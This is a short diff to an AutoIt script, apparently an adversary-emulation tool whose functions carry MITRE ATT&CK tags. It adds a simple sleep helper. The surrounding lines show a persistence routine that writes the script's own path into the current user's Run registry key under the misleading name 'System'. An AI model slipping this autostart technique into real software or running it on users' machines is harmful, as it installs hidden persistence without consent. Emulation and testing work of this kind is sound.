@@ -38,6 +38,11 @@ Func init();DESCRIPTION:init;MITRE:-
    EndIf
 EndFunc
 
+Func PauseSeconds($seconds)
+   Sleep($seconds * 1000)
+   Return 1
+EndFunc
+
 Func SetPersistent4CurrentUser();DESCRIPTION:Get the exe persistent for current user;MITRE:Persistence
    ;TODO add check if key already there before write
    RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "System", "REG_SZ", @ScriptDir & "\" & @ScriptName)
